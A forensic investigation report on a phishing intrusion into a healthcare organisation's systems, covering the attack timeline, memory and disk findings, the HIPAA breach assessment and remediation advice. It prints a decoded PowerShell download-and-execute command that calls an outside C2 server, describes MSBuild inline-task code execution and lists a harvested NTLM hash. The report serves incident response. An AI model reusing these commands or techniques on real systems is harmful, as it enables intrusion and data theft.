# Forensic Investigation Report: LH-2026-0414-01

**Case:** LH-2026-0414-01 | **Incident:** IR-2026-0414-01  
**Hold:** Helena Reyes, 2026-04-14T07:30Z | **Date:** 2026-10-18  
**Investigator:** Massimo | **Classification:** Internal — Legal Hold  
**Distribution:** Dr. Patricia Morales (CISO), Helena Reyes (General Counsel), James Chen (SOC Lead)

## Executive Summary

Between April 13–14, 2026, an attacker compromised a laboratory technician through phishing, gained remote access to MedDefense systems, and accessed 14 patient laboratory reports.

**Timeline:** Phishing link clicked 2026-04-13T18:14:02Z → credentials submitted 18:14:41Z → malware downloaded 18:14:43Z → remote VPN access 2026-04-14T02:44:17Z → malware execution 02:46:57Z → lateral movement 03:22:47Z → patient files accessed 03:43:30Z.

**What was accessed:** 14 laboratory PDFs containing patient names, dates of birth, attending physicians, and lab results (blood counts, metabolites).

**Mechanism:** PowerShell with Base64-encoded payload executed MSBuild.exe to load malicious C# code. Attacker used stolen Kerberos tickets to move laterally to a second workstation and file server.

**Certainty:** Attack chain confirmed across disk, memory, authentication logs, and proxy logs.

## Methodology

**Artifacts:** ART-001 (wst-ws-031.dd, 250 GB), ART-002 (wst-ws-031.mem, 16 GB), ART-003 (wst-ws-017.mem, 16 GB), ART-004/005 (SIEM alert, proxy logs, auth logs).

**Tools:** Sleuthkit (fsstat, fls, mactime), Volatility 3 (pslist, pstree, cmdline, netscan, dlllist, malfind, hashdump), sha256sum.

**Integrity:** All evidence preserved read-only under litigation hold. Analysis on verified copies. Every access logged in chain of custody (chain_of_custody.md). Known gap: no acquisition-time hashes; baselines computed post-incident.

## Technical Findings

### Disk (ART-001)

**Phishing payload** — update.zip (421 KB) in C:\Users\dmarsh\Downloads\ created 2026-04-13T18:14:43Z. Matches proxy log download from ms0365-support.login-verification.click (proxy_log.jsonl:21). Evidence: filesystem_analysis.md F01.

**Malicious config** — update.xml (2,847 bytes) in C:\Users\dmarsh\AppData\Local\Temp\ created 2026-04-14T02:46:56Z. Path and name match MSBuild command line in SIEM alert A-20260414-9841. Contains MSBuild inline task XML enabling C# execution. Evidence: filesystem_analysis.md F02.

**Persistence** — Four mechanisms installed 2026-04-14T02:47:06Z–02:47:15Z: Run keys (WindowsUpdateSvc, DefenderAutoUpdate) and scheduled tasks (UpdateScheduler, WindowsDefenderCache). All reference malicious executables (svchost-update.exe, payload_loader.ps1). Evidence: persistence_analysis.md R01–R05.

### Memory (ART-002 & ART-003)

**Process tree (WST-WS-031)** — explorer.exe → powershell.exe (PID 7812) → MSBuild.exe (PID 8104) → cmd.exe starting 2026-04-14T02:46:41Z. Parent-child chain confirmed. Evidence: memory_analysis.md M01, SIEM alert.

**Encoded command** — PowerShell `-ep bypass -w hidden -enc` with Base64 payload. Decoded: `$s="https://185.220.101.47/beacon"; IEX(DownloadString(...))`. Evidence: memory_analysis.md M02, correlated_timeline.md.

**C2 active** — WST-WS-031: three ESTABLISHED sockets MSBuild→185.220.101.47:443 (TOR relay) at capture 2026-04-14T03:02Z. WST-WS-017: two sockets MSBuild→91.234.99.107:443 at capture 03:38Z. Evidence: memory_analysis.md M04, M02 (ART-003); proxy_log.jsonl 24–27.

**Code injection** — PE executable (MZ 0x5a4d) at 0x1f0000 in anonymous RWX memory (20 KB). Base relocation table indicates reflective DLL injection. Evidence: memory_analysis.md M05.

**Credentials harvested** — NTLM hash dmarsh: `a742f6d42e2aa1d62ef3249a1ef2f1c8` extracted from LSASS. Handles open to SAM, Security, MSLSA_STATE (Kerberos tickets). Evidence: memory_analysis.md M07–M08.

### Authentication (ART-005)

**Credential compromise** — Azure AD signin from Russia IP 45.63.9.88 at 2026-04-13T18:14:41Z (sync with phishing submit). VPN logon same credentials 2026-04-14T02:44:17Z. Evidence: ad_auth_log.jsonl 3, 7.

**Pass-the-Ticket** — Kerberos TGS-REQ cifs/WST-WS-017 at 2026-04-14T03:22:47Z → network logon WST-WS-017 at 03:23:01Z. Identical attack pattern executed on secondary host (memory_analysis.md M01 ART-003). Evidence: ad_auth_log.jsonl 8, 10; memory_analysis.md ART-003.

**PHI breach** — File server access LIS-WSIDE-01 at 2026-04-14T03:40:18Z → 14 PDFs opened from LIS_REPORTS$ (`C:\LIS\reports\daily\*.pdf`) at 03:43:30Z. Evidence: ad_auth_log.jsonl 11, 14.

### Network (ART-004)

**Phishing campaign** — Link visit 2026-04-13T18:14:02Z → form submit 18:14:41Z → download 18:14:43Z (update.zip, 421 KB). Evidence: proxy_log.jsonl 14, 20, 21.

**C2 beaconing** — MSBuild 185.220.101.47:443 (TOR) 2026-04-14T02:46:58Z–02:47:30Z (3 attempts). MSBuild WST-WS-017 91.234.99.107:443 03:27:13Z–03:27:45Z. Evidence: proxy_log.jsonl 24–27.

## Timeline (Correlated)

| Time (UTC) | Event | Evidence |
| --- | --- | --- |
| 2026-04-13T18:14:02Z | Phishing link | proxy_log:14 |
| 2026-04-13T18:14:41Z | Credentials submitted | proxy_log:20 |
| 2026-04-13T18:14:43Z | Malware download | proxy_log:21 + filesystem F01 |
| 2026-04-14T02:44:17Z | VPN logon (Russia) | auth_log:7 |
| 2026-04-14T02:46:41Z | PowerShell execution | memory M02 |
| 2026-04-14T02:46:57Z | MSBuild + C2 starts | memory M01 + SIEM |
| 2026-04-14T02:47:06Z | Persistence installed | persistence R04 |
| 2026-04-14T03:02Z | Memory acquired (WS031) | ART-002 |
| 2026-04-14T03:22:47Z | Kerberos TGS (lateral move) | auth_log:8 |
| 2026-04-14T03:23:01Z | Logon WS-017 | auth_log:10 |
| 2026-04-14T03:27:13Z | C2 WS-017 (91.234.99.107) | proxy_log:26 |
| 2026-04-14T03:40:18Z | Logon LIS-WSIDE-01 | auth_log:11 |
| 2026-04-14T03:43:30Z | 14 PDFs accessed | auth_log:14 |

*Full timeline: correlated_timeline.md (30 events)*

## HIPAA Breach Scope

**PHI accessed:** Patient name, DOB, attending physician, lab results (CBC, metabolites) in 14 laboratory PDFs. Evidence: filesystem_analysis.md E06.

**Patients affected:** 14 from ER department.

**Four-factor assessment (45 CFR § 164.402):**
- Nature of PHI: Highly identifiable (name, DOB, lab values)
- Who accessed: Attacker-controlled malware
- Actual access: Forensics confirm files opened
- Risk mitigation: No encryption, active C2, minimal controls

**Outcome:** Low-probability exception does NOT apply. Breach confirmed. Mandatory individual notification required within 60 days (45 CFR § 164.404). No HHS/media notification (below 500-person threshold).

## Gaps & Limitations

**Evidence gaps:** No acquisition-time hashes (baselines computed 6 months post-incident). Source systems rebuilt; re-acquisition impossible. Disk imaged 3 hours after memory; filesystem state at memory-capture time unknown. File server audit logs not extracted; exact access sequence to 14 PDFs unknown.

**Analysis limits:** 24-hour proxy window only; earlier reconnaissance not visible. Encoded PowerShell payload not fully decompiled. Attacker identity/affiliation unknown. Scope on non-acquired systems unknown.

---

## Recommendations

1. **Hardware security keys (VPN/SSO)** — Phishing captured password; FIDO2 key prevents reuse. Timeline: 8 weeks.

2. **Memory-resident EDR (code injection detection)** — Injected code at 0x1f0000 could have triggered alert at runtime. Timeline: 4 weeks.

3. **Network segmentation (zero-trust lateral move)** — Pass-the-Ticket crossed trust boundaries unchecked. Implement Kerberos delegation limits, MFA at entry points. Timeline: 12 weeks.

4. **Transparent encryption at rest (ePHI)** — 14 PDFs accessed in plaintext. TDE on file shares with separate key custody. Timeline: 6 weeks.

5. **Baseline hashes at acquisition** — Future incidents must hash before first analysis access. Timeline: immediate (process change).


**Investigator:** Massimo | **Date:** 2026-10-18  
*Attorney-client privileged and work product. Distribution restricted.*
